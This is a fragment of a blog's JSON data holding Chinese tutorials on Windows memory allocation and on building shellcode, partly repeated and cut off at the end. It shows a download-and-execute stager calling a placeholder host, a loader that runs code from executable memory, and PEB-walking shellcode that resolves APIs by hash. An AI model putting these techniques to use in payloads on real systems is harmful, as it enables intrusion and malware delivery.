allocated for path name\\n&quot;);\n        free(string);\n        printf(&quot;Memory freed\\n&quot;);\n    }\n}</code></pre>\n<h3 id=\"new\"><a href=\"#new\" class=\"headerlink\" title=\"new\"></a>new</h3><p>平常中申请动态内存时用的API</p>\n<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n{\n\n    char* p = NULL;\n    char s[] = &quot;Hello world!&quot;;\n    p = new char[1024];\n    if (!p)\n    {\n        printf(&quot;Mem Alloc Failed!\\n&quot;);\n        return 0;\n    }\n    ZeroMemory(p, 1024);\n    memcpy(p, s, strlen(s));\n    printf(&quot;Mem Info -&gt; %s \\n&quot;, p);\n    delete[] p;\n    p = NULL;\n    return 0;\n}</code></pre><h3 id=\"virtualAlloc和virtualAllocEx\"><a href=\"#virtualAlloc和virtualAllocEx\" class=\"headerlink\" title=\"virtualAlloc和virtualAllocEx\"></a>virtualAlloc和virtualAllocEx</h3><p>virtualAlloc 申请自己的内存</p>\n<p>virtualAllocEx 可以指定进程申请</p>\n<p>这个比较常用有特殊需求的内存时，比如要申请可以执行内存</p>\n<pre><code class=\"c++\">    HANDLE hProcess = NULL;\n    LPVOID p =  VirtualAllocEx(hProcess, NULL,1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    VirtualFreeEx(hProcess, p, 1024, MEM_RELEASE | MEM_DECOMMIT);\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"三种内存分配例子使用\"><a href=\"#三种内存分配例子使用\" class=\"headerlink\" title=\"三种内存分配例子使用\"></a>三种内存分配例子使用</h3><h4 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h4><p><strong>C运行库中的动态内存分配函数</strong>，用的较少，在C中常见</p>\n<p>申请堆中的空间使用，释放使用<strong>free</strong></p>\n<p>exp：</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\nint main(void)\n{\n    char* string;\n\n    string = malloc(1024);\n\n    if (string == NULL)\n        printf(&quot;Insufficient memory available\\n&quot;);\n    else\n    {\n        printf(&quot;Memory space allocated for path name\\n&quot;);\n        free(string);\n        printf(&quot;Memory freed\\n&quot;);\n    }\n}</code></pre>\n<h3 id=\"new\"><a href=\"#new\" class=\"headerlink\" title=\"new\"></a>new</h3><p>平常中申请动态内存时用的API</p>\n<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n{\n\n    char* p = NULL;\n    char s[] = &quot;Hello world!&quot;;\n    p = new char[1024];\n    if (!p)\n    {\n        printf(&quot;Mem Alloc Failed!\\n&quot;);\n        return 0;\n    }\n    ZeroMemory(p, 1024);\n    memcpy(p, s, strlen(s));\n    printf(&quot;Mem Info -&gt; %s \\n&quot;, p);\n    delete[] p;\n    p = NULL;\n    return 0;\n}</code></pre><h3 id=\"virtualAlloc和virtualAllocEx\"><a href=\"#virtualAlloc和virtualAllocEx\" class=\"headerlink\" title=\"virtualAlloc和virtualAllocEx\"></a>virtualAlloc和virtualAllocEx</h3><p>virtualAlloc 申请自己的内存</p>\n<p>virtualAllocEx 可以指定进程申请</p>\n<p>这个比较常用有特殊需求的内存时，比如要申请可以执行内存</p>\n<pre><code class=\"c++\">    HANDLE hProcess = NULL;\n    LPVOID p =  VirtualAllocEx(hProcess, NULL,1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    VirtualFreeEx(hProcess, p, 1024, MEM_RELEASE | MEM_DECOMMIT);\n</code></pre>\n"},{"title":"Inter 自动化shellcode","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png","_content":"\n## 思路：\n\n学习来源[3gstudent](https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/)\n\n总结`3gstudent`的两篇文章\n\n>小知识\n\n|        类型         | 32位大小 | 64位大小 |\n| :-----------------: | :------: | :------: |\n|        char         | 1个字节  | 1个字节  |\n| char*（即指针变量） | 4个字节  | 8个字节  |\n|      short int      | 2个字节  | 2个字节  |\n|         int         | 4个字节  | 4个字节  |\n|    unsigned int     | 4个字节  | 4个字节  |\n|        float        | 4个字节  | 4个字节  |\n|       double        | 8个字节  | 8个字节  |\n|        long         | 4个字节  | 8个字节  |\n|      long long      | 8个字节  | 8个字节  |\n|    unsigned long    | 4个字节  | 8个字节  |\n\n\n## shellcode 生成的三种方法\n\n### 1.手工\n\n可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用\n\n### 2.使用自动化工具\n[shellcode compiler](https://github.com/NytroRST/ShellcodeCompiler)\n使用的时候下载release程序，生成shellcode就能用。目前已经支持平台\n\n> Windows (x86 and x64) and Linux (x86 and x64)\n\n使用方法：给了很多例子，这里说明一个Demo\n```c++\n    function URLDownloadToFileA(\"urlmon.dll\");     \n\t//等于GetProcAddress(LoadLibraryA(\"urlmon.dll\"), \"URLDownloadToFileA\");\n    function WinExec(\"kernel32.dll\");\n    function ExitProcess(\"kernel32.dll\");\n\n    URLDownloadToFileA(0,\"https://site.com/bk.exe\",\"bk.exe\",0,0);    // 直接调用api即可\n    WinExec(\"bk.exe\",0);\n    ExitProcess(0);\n```\n将上面的保存为sourse.txt，然后生成shellcode即可\n\n命令详见github\n\n生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试\n\n下面时我的测试代码\n```c++\n#include <iostream>\n#include <windows.h>\nusing namespace std;\nsize_t GetSize(LPSTR szFilePath)\n{\n\tsize_t Size_File = 0;\n\tFILE* fp;\n\tfopen_s(&fp, szFilePath, \"rb\");\n\tfseek(fp, 0, SEEK_END);\n\tSize_File = ftell(fp);\n\trewind(fp);\n\tfclose(fp);\n\treturn Size_File;\n}\n\nint main()\n{\n\tchar File_path[MAX_PATH] = { 0, };\n#ifdef _WIN64\n\tcout << \"Input 64bit Shellcode:\";\n#else\n\tcout << \"Input 32bit Shellcode:\";\n#endif\n\tcin >> File_path;\n\tif (*File_path == NULL){return -1;}\n\tLPVOID lpBuffer = NULL;\n\tsize_t Shellcode_Size = GetSize(File_path);\n\tlpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tif (!lpBuffer){return -1;}\n\tFILE *fp;\n\tfopen_s(&fp, File_path, \"rb\");\n\tfread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);\n\tfclose(fp);\n\n\t(*(int(*)())lpBuffer)();//调用该函数\n\n\tVirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);\n\treturn 0;\n}\n\n```\n\n\n### 3.使用Visual Studio生成Shellcode\n\n **环境**\n\nVisual Studio 2019（其他本版都行）\n* 使用release生成\n* 禁用优化\n* 禁用安全检测（/GS-）\n\n核心思路，不要使用全局变量，常见的字符串操作都自己写函数\n\n代码参考3gstudent\n```c++\n#include <windows.h>\n#include <Winternl.h>\n#include <stdio.h>\n\n#pragma optimize( \"\", off ) \nvoid shell_code();\nHANDLE GetKernel32Handle();\nBOOL __ISUPPER__(__in CHAR c);\nCHAR __TOLOWER__(__in CHAR c);\nUINT __STRLEN__(__in LPSTR lpStr1);\nUINT __STRLENW__(__in LPWSTR lpStr1);\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);\nINT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);\nINT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);\nLPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);\nUINT __CalcHash__(__in LPVOID lpStr);\n\ntypedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);\ntypedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);\ntypedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);\n\n\nvoid shell_code() {\n\n\tLoadLibraryWAPI\tloadlibrarywapi = 0;\n\tGetProcAddressAPI getprocaddressapi = 0;\n\tMESSAGEBOXAPI messageboxapi = 0;\n\n\twchar_t struser32[] = { L'u', L's', L'e', L'r', L'3',L'2', L'.', L'd', L'l', L'l', 0 };\n\tchar MeassageboxA_api[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };\n\tchar MeassageText[] = { 'H','e','l','l','o','.','W','o','l','r','d','!',0 };\n\n\tHANDLE hKernel32 = GetKernel32Handle();\n\tif (hKernel32 == INVALID_HANDLE_VALUE) {\n\t\treturn;\n\t}\n\tLPBYTE lpBaseAddr = (LPBYTE)hKernel32;\n\tPIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;\n\tPIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);\n\tPIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n\tLPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);\n\tLPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);\n\tLPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);\n\t//CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };\n\t//CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };\n\tUINT HashrLoadLibraryA = 0x6fffef88;\n\tUINT HashrGetProcAddress = 0x3f8aaa7e;\n\n\tfor (UINT i = 0; i < pExportDir->NumberOfNames; i++) {\n\t\tLPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);\n\t\t//if (!__STRCMPI__(pFuncName, strGetProcAddress)) {\n\t\tif (__CalcHash__(pFuncName) == HashrGetProcAddress) {\n\t\t\tgetprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n\t\t}\n\t\t//else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {\n\t\telse if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {\n\t\t\tloadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n\t\t}\n\t\tif (getprocaddressapi != nullptr && loadlibrarywapi != nullptr) {\n\t\t\tmessageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);\n\t\t\tmessageboxapi(NULL, MeassageText, NULL, 0);\n\t\t\treturn;\n\t\t}\n\t}\n}\n\ninline BOOL __ISUPPER__(__in CHAR c) {\n\treturn ('A' <= c) && (c <= 'Z');\n};\ninline CHAR __TOLOWER__(__in CHAR c) {\n\treturn __ISUPPER__(c) ? c - 'A' + 'a' : c;\n};\n\nUINT __STRLEN__(__in LPSTR lpStr1)\n{\n\tUINT i = 0;\n\twhile (lpStr1[i] != 0x0)\n\t\ti++;\n\treturn i;\n}\n\nUINT __STRLENW__(__in LPWSTR lpStr1)\n{\n\tUINT i = 0;\n\twhile (lpStr1[i] != L'\\0')\n\t\ti++;\n\treturn i;\n}\n\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)\n{\n\tCHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);\n\tif (!c)\n\t\treturn lpStr1;\n\tUINT dwLen = __STRLENW__(lpStr2);\n\tdo\n\t{\n\t\tCHAR sc;\n\t\tdo\n\t\t{\n\t\t\tsc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);\n\t\t\tif (!sc)\n\t\t\t\treturn NULL;\n\t\t} while (sc != c);\n\t} while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);\n\treturn (lpStr1 - 1); // FIXME -2 ?\n}\n\nINT __STRCMPI__(\n\t__in LPSTR lpStr1,\n\t__in LPSTR lpStr2)\n{\n\tint  v;\n\tCHAR c1, c2;\n\tdo\n\t{\n\t\tc1 = *lpStr1++;\n\t\tc2 = *lpStr2++;\n\t\t// The casts are necessary when pStr1 is shorter & char is signed \n\t\tv = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n\t} while ((v == 0) && (c1 != '\\0') && (c2 != '\\0'));\n\treturn v;\n}\n\nINT __STRNCMPIW__(\n\t__in LPWSTR lpStr1,\n\t__in LPWSTR lpStr2,\n\t__in DWORD dwLen)\n{\n\tint  v;\n\tCHAR c1, c2;\n\tdo {\n\t\tdwLen--;\n\t\tc1 = ((PCHAR)lpStr1++)[0];\n\t\tc2 = ((PCHAR)lpStr2++)[0];\n\t\t/* The casts are necessary when pStr1 is shorter & char is signed */\n\t\tv = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n\t} while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);\n\treturn v;\n}\n\nLPSTR __STRCAT__(\n\t__in LPSTR\tstrDest,\n\t__in LPSTR strSource)\n{\n\tLPSTR d = strDest;\n\tLPSTR s = strSource;\n\twhile (*d) d++;\n\tdo { *d++ = *s++; } while (*s);\n\t*d = 0x0;\n\treturn strDest;\n}\n\nLPVOID __MEMCPY__(\n\t__in LPVOID lpDst,\n\t__in LPVOID lpSrc,\n\t__in DWORD dwCount)\n{\n\tLPBYTE s = (LPBYTE)lpSrc;\n\tLPBYTE d = (LPBYTE)lpDst;\n\twhile (dwCount--)\n\t\t* d++ = *s++;\n\treturn lpDst;\n}\n\nUINT __CalcHash__(\n\t__in LPVOID lpStr\n)\n{\n\tUINT ApiHash = 0;\n\tLPBYTE s = (LPBYTE)lpStr;\n\tdo\n\t{\n\t\tApiHash = (ApiHash << 7) + (ApiHash >> 25) + *s;\n\t} while (*s++);\n\treturn ApiHash;\n}\n\nHANDLE GetKernel32Handle() {\n\tHANDLE hKernel32 = INVALID_HANDLE_VALUE;\n#ifdef _WIN64\n\tPPEB lpPeb = (PPEB)__readgsqword(0x60);\n#else\n\tPPEB lpPeb = (PPEB)__readfsdword(0x30);\n#endif\n\tPLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;\n\tPLIST_ENTRY pListEntry = pListHead->Flink;\n\tWCHAR strDllName[MAX_PATH];\n\tWCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\\0' };\n\n\twhile (pListEntry != pListHead) {\n\t\tPLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n\t\tif (pModEntry->FullDllName.Length) {\n\t\t\tDWORD dwLen = pModEntry->FullDllName.Length;\n\t\t\t__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);\n\t\t\tstrDllName[dwLen / sizeof(WCHAR)] = L'\\0';\n\t\t\tif (__STRSTRIW__(strDllName, strKernel32)) {\n\t\t\t\thKernel32 = pModEntry->DllBase;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tpListEntry = pListEntry->Flink;\n\t}\n\treturn hKernel32;\n}\n\n//void __declspec(naked) END_SHELLCODE(void) {}\n\nvoid END_SHELLCODE(void) {}\n\nint main()\n{\n\tshell_code();\n\tFILE* output_file;\n#ifdef _WIN64\n\tfopen_s(&output_file, \"shellcode_x64.bin\", \"wb\");\n#else\n\tfopen_s(&output_file, \"shellcode_x32.bin\", \"wb\");\n#endif\n\tfwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);\n\tfclose(output_file);\n\treturn 0;\n}\n```\n稍微修改了一点，使用**x64**位编译就可以生成**64位shellcode**，使用**x32**就能生成32位**shellcode**。\n\n使用了**hash函数名**的方式去找API，不用开那么大栈空间\n\n总结一下：\n\n类似`memcpy、strlen、strcat`等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。\n\nC++ 中字符数组定义格式有下面三种\n\n```c++\n    const char* str1 = \"I am Str1!\";\n\tchar str2[] = \"I am Str2!\";\n\tchar str3[] = { 'H','e','l','l','o','.','W','o','l','r','d','!',0 };\n```\n前面两种都是将字符串保存在`rdata`段中，第三种方式是将字符串保存在栈中，最后的0表示'\\0',如果没有结束标志，可能会操作到栈后面的数据。","source":"_posts/自动化ShellCode.md","raw":"---\ntitle: Inter 自动化shellcode\ntags: [汇编]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png\n---\n\n## 思路：\n\n学习来源[3gstudent](https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/)\n\n总结`3gstudent`的两篇文章\n\n>小知识\n\n|        类型         | 32位大小 | 64位大小 |\n| :-----------------: | :------: | :------: |\n|        char         | 1个字节  | 1个字节  |\n| char*（即指针变量） | 4个字节  | 8个字节  |\n|      short int      | 2个字节  | 2个字节  |\n|         int         | 4个字节  | 4个字节  |\n|    unsigned int     | 4个字节  | 4个字节  |\n|        float        | 4个字节  | 4个字节  |\n|       double        | 8个字节  | 8个字节  |\n|        long         | 4个字节  | 8个字节  |\n|      long long      | 8个字节  | 8个字节  |\n|    unsigned long    | 4个字节  | 8个字节  |\n\n\n## shellcode 生成的三种方法\n\n### 1.手工\n\n可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用\n\n### 2.使用自动化工具\n[shellcode compiler](https://github.com/NytroRST/ShellcodeCompiler)\n使用的时候下载release程序，生成shellcode就能用。目前已经支持平台\n\n> Windows (x86 and x64) and Linux (x86 and x64)\n\n使用方法：给了很多例子，这里说明一个Demo\n```c++\n    function URLDownloadToFileA(\"urlmon.dll\");     \n\t//等于GetProcAddress(LoadLibraryA(\"urlmon.dll\"), \"URLDownloadToFileA\");\n    function WinExec(\"kernel32.dll\");\n    function ExitProcess(\"kernel32.dll\");\n\n    URLDownloadToFileA(0,\"https://site.com/bk.exe\",\"bk.exe\",0,0);    // 直接调用api即可\n    WinExec(\"bk.exe\",0);\n    ExitProcess(0);\n```\n将上面的保存为sourse.txt，然后生成shellcode即可\n\n命令详见github\n\n生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试\n\n下面时我的测试代码\n```c++\n#include <iostream>\n#include <windows.h>\nusing namespace std;\nsize_t GetSize(LPSTR szFilePath)\n{\n\tsize_t Size_File = 0;\n\tFILE* fp;\n\tfopen_s(&fp, szFilePath, \"rb\");\n\tfseek(fp, 0, SEEK_END);\n\tSize_File = ftell(fp);\n\trewind(fp);\n\tfclose(fp);\n\treturn Size_File;\n}\n\nint main()\n{\n\tchar File_path[MAX_PATH] = { 0, };\n#ifdef _WIN64\n\tcout << \"Input 64bit Shellcode:\";\n#else\n\tcout << \"Input 32bit Shellcode:\";\n#endif\n\tcin >> File_path;\n\tif (*File_path == NULL){return -1;}\n\tLPVOID lpBuffer = NULL;\n\tsize_t Shellcode_Size = GetSize(File_path);\n\tlpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tif (!lpBuffer){return -1;}\n\tFILE *fp;\n\tfopen_s(&fp, File_path, \"rb\");\n\tfread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);\n\tfclose(fp);\n\n\t(*(int(*)())lpBuffer)();//调用该函数\n\n\tVirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);\n\treturn 0;\n}\n\n```\n\n\n### 3.使用Visual Studio生成Shellcode\n\n **环境**\n\nVisual Studio 2019（其他本版都行）\n* 使用release生成\n* 禁用优化\n* 禁用安全检测（/GS-）\n\n核心思路，不要使用全局变量，常见的字符串操作都自己写函数\n\n代码参考3gstudent\n```c++\n#include <windows.h>\n#include <Winternl.h>\n#include <stdio.h>\n\n#pragma optimize( \"\", off ) \nvoid shell_code();\nHANDLE GetKernel32Handle();\nBOOL __ISUPPER__(__in CHAR c);\nCHAR __TOLOWER__(__in CHAR c);\nUINT __STRLEN__(__in LPSTR lpStr1);\nUINT __STRLENW__(__in LPWSTR lpStr1);\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);\nINT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);\nINT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);\nLPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);\nUINT __CalcHash__(__in LPVOID lpStr);\n\ntypedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);\ntypedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);\ntypedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);\n\n\nvoid shell_code() {\n\n\tLoadLibraryWAPI\tloadlibrarywapi = 0;\n\tGetProcAddressAPI getprocaddressapi = 0;\n\tMESSAGEBOXAPI messageboxapi = 0;\n\n\twchar_t struser32[] = { L'u', L's', L'e', L'r', L'3',L'2', L'.', L'd', L'l', L'l', 0 };\n\tchar MeassageboxA_api[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };\n\tchar MeassageText[] = { 'H','e','l','l','o','.','W','o','l','r','d','!',0 };\n\n\tHANDLE hKernel32 = GetKernel32Handle();\n\tif (hKernel32 == INVALID_HANDLE_VALUE) {\n\t\treturn;\n\t}\n\tLPBYTE lpBaseAddr = (LPBYTE)hKernel32;\n\tPIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;\n\tPIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);\n\tPIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n\tLPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);\n\tLPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);\n\tLPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);\n\t//CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };\n\t//CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };\n\tUINT HashrLoadLibraryA = 0x6fffef88;\n\tUINT HashrGetProcAddress = 0x3f8aaa7e;\n\n\tfor (UINT i = 0; i < pExportDir->NumberOfNames; i++) {\n\t\tLPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);\n\t\t//if (!__STRCMPI__(pFuncName, strGetProcAddress)) {\n\t\tif (__CalcHash__(pFuncName) == HashrGetProcAddress) {\n\t\t\tgetprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n\t\t}\n\t\t//else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {\n\t\telse if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {\n\t\t\tloadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n\t\t}\n\t\tif (getprocaddressapi != nullptr && loadlibrarywapi != nullptr) {\n\t\t\tmessageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);\n\t\t\tmessageboxapi(NULL, MeassageText, NULL, 0);\n\t\t\treturn;\n\t\t}\n\t}\n}\n\ninline BOOL __ISUPPER__(__in CHAR c) {\n\treturn ('A' <= c) && (c <= 'Z');\n};\ninline CHAR __TOLOWER__(__in CHAR c) {\n\treturn __ISUPPER__(c) ? c - 'A' + 'a' : c;\n};\n\nUINT __STRLEN__(__in LPSTR lpStr1)\n{\n\tUINT i = 0;\n\twhile (lpStr1[i] != 0x0)\n\t\ti++;\n\treturn i;\n}\n\nUINT __STRLENW__(__in LPWSTR lpStr1)\n{\n\tUINT i = 0;\n\twhile (lpStr1[i] != L'\\0')\n\t\ti++;\n\treturn i;\n}\n\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)\n{\n\tCHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);\n\tif (!c)\n\t\treturn lpStr1;\n\tUINT dwLen = __STRLENW__(lpStr2);\n\tdo\n\t{\n\t\tCHAR sc;\n\t\tdo\n\t\t{\n\t\t\tsc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);\n\t\t\tif (!sc)\n\t\t\t\treturn NULL;\n\t\t} while (sc != c);\n\t} while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);\n\treturn (lpStr1 - 1); // FIXME -2 ?\n}\n\nINT __STRCMPI__(\n\t__in LPSTR lpStr1,\n\t__in LPSTR lpStr2)\n{\n\tint  v;\n\tCHAR c1, c2;\n\tdo\n\t{\n\t\tc1 = *lpStr1++;\n\t\tc2 = *lpStr2++;\n\t\t// The casts are necessary when pStr1 is shorter & char is signed \n\t\tv = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n\t} while ((v == 0) && (c1 != '\\0') && (c2 != '\\0'));\n\treturn v;\n}\n\nINT __STRNCMPIW__(\n\t__in LPWSTR lpStr1,\n\t__in LPWSTR lpStr2,\n\t__in DWORD dwLen)\n{\n\tint  v;\n\tCHAR c1, c2;\n\tdo {\n\t\tdwLen--;\n\t\tc1 = ((PCHAR)lpStr1++)[0];\n\t\tc2 = ((PCHAR)lpStr2++)[0];\n\t\t/* The casts are necessary when pStr1 is shorter & char is signed */\n\t\tv = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n\t} while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);\n\treturn v;\n}\n\nLPSTR __STRCAT__(\n\t__in LPSTR\tstrDest,\n\t__in LPSTR strSource)\n{\n\tLPSTR d = strDest;\n\tLPSTR s = strSource;\n\twhile (*d) d++;\n\tdo { *d++ = *s++; } while (*s);\n\t*d = 0x0;\n\treturn strDest;\n}\n\nLPVOID __MEMCPY__(\n\t__in LPVOID lpDst,\n\t__in LPVOID lpSrc,\n\t__in DWORD dwCount)\n{\n\tLPBYTE s = (LPBYTE)lpSrc;\n\tLPBYTE d = (LPBYTE)lpDst;\n\twhile (dwCount--)\n\t\t* d++ = *s++;\n\treturn lpDst;\n}\n\nUINT __CalcHash__(\n\t__in LPVOID lpStr\n)\n{\n\tUINT ApiHash = 0;\n\tLPBYTE s = (LPBYTE)lpStr;\n\tdo\n\t{\n\t\tApiHash = (ApiHash << 7) + (ApiHash >> 25) + *s;\n\t} while (*s++);\n\treturn ApiHash;\n}\n\nHANDLE GetKernel32Handle() {\n\tHANDLE hKernel32 = INVALID_HANDLE_VALUE;\n#ifdef _WIN64\n\tPPEB lpPeb = (PPEB)__readgsqword(0x60);\n#else\n\tPPEB lpPeb = (PPEB)__readfsdword(0x30);\n#endif\n\tPLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;\n\tPLIST_ENTRY pListEntry = pListHead->Flink;\n\tWCHAR strDllName[MAX_PATH];\n\tWCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\\0' };\n\n\twhile (pListEntry != pListHead) {\n\t\tPLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n\t\tif (pModEntry->FullDllName.Length) {\n\t\t\tDWORD dwLen = pModEntry->FullDllName.Length;\n\t\t\t__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);\n\t\t\tstrDllName[dwLen / sizeof(WCHAR)] = L'\\0';\n\t\t\tif (__STRSTRIW__(strDllName, strKernel32)) {\n\t\t\t\thKernel32 = pModEntry->DllBase;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tpListEntry = pListEntry->Flink;\n\t}\n\treturn hKernel32;\n}\n\n//void __declspec(naked) END_SHELLCODE(void) {}\n\nvoid END_SHELLCODE(void) {}\n\nint main()\n{\n\tshell_code();\n\tFILE* output_file;\n#ifdef _WIN64\n\tfopen_s(&output_file, \"shellcode_x64.bin\", \"wb\");\n#else\n\tfopen_s(&output_file, \"shellcode_x32.bin\", \"wb\");\n#endif\n\tfwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);\n\tfclose(output_file);\n\treturn 